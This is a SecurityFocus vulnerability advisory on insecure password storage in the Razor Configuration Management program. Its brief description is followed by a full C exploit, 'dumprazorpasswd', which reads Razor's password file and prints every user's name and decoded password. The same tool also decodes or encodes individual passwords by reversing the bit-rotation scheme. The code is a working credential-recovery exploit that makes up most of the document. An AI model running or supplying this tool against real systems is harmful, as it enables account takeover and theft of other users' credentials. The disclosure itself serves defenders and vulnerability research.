source: http://www.securityfocus.com/bid/1424/info

The Razor Configuration Management program stores passwords in an insecure manner.

A local attacker can obtain the Razor passwords, and either seize control of the software and relevant databases or use those passwords to access other users' accounts on the network. 

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <ctype.h>

/************************************************************

  dumprazorpasswd - 
    dumprazorpasswd
			- prompts for input hex string to decode
    dumprazorpasswd <razor_passwd_file>
			- prints the users and passwords in <file>
    dumprazorpasswd <passwd>
			- encrypts <passwd> and prints it in hex 

  16-jun-2000	pbw.

************************************************************/

#define ASCII2BIN(c) ( isdigit(c) ? c - '0' : toupper(c) - '7' )

#define ROT8L(c,b) ( (c)=( ( (c<< (b%8) ) + (c>>(8-(b%8))&((1<<(b%8))-1)) )
& 0x00ff) )
#define ROT8R(c,b) ( (c)=( ( (c<< (8-(b%8)) ) + (
c>>(b%8)&((1<<(8-(b%8)))-1)) ) & 0x00ff) )

struct pwent
  {
  char uname[17];
  char psswd[17];
  char gname[17];
  };

dumpfile (int fd)
{
int    status, k;
struct pwent pwent;

while ( (status = read (fd, &pwent, 51)) > 0 )
  {
  if (status != 51)
      {
      printf ("fd = %d\n", fd);
      printf ("partial read! only read %d bytes\n", status);
      exit(0);
      }
  k = 0;
  while (pwent.psswd[k] != '\0')
    {
    ROT8L(pwent.psswd[k], 10);
    k++;
    }
  printf ("user %-17s  %-17s\n", &(pwent.uname[0]), &(pwent.psswd[0]));
  }
}

main (int argc, char *argv[])

{
int  fd,i,k;
char   passwd[18];
char   dpasswd[9];

if (argc < 2)
    {
    printf("razor passwd to decrypt :");
    fgets(passwd, 17, stdin);
    passwd[strlen(passwd)-1] = 0;
    k=0;
    for (i=0 ; i<9 ; dpasswd[i++]=0);
    for (i=(strlen(passwd)-1) ; i>=0 ; i--)
      {
      if (k & 1)
          {
          dpasswd[i/2] |= ((ASCII2BIN(passwd[i]) << 4) & 0xf0);
          }
        else
          {
          dpasswd[i/2] = ASCII2BIN(passwd[i]) & 0x0f;
          }
      k++;
      }
    for (i=0 ; i<strlen(dpasswd) ; i++)
      ROT8L(dpasswd[i], 2);
    printf("%s\n", dpasswd);
    exit(0);
    }
fd = open (argv[1], O_RDONLY);
if (fd < 0)
    {					/* assume arg is a passwd to encrypt
*/
    for ( i=0 ; i<strlen(argv[1]) ; i++)
      printf("%02X", (unsigned char)ROT8R(argv[1][i], 2) );
    printf("\n");
    }
  else
    {					/* dump file */
    dumpfile(fd);
    }
exit(0);
}
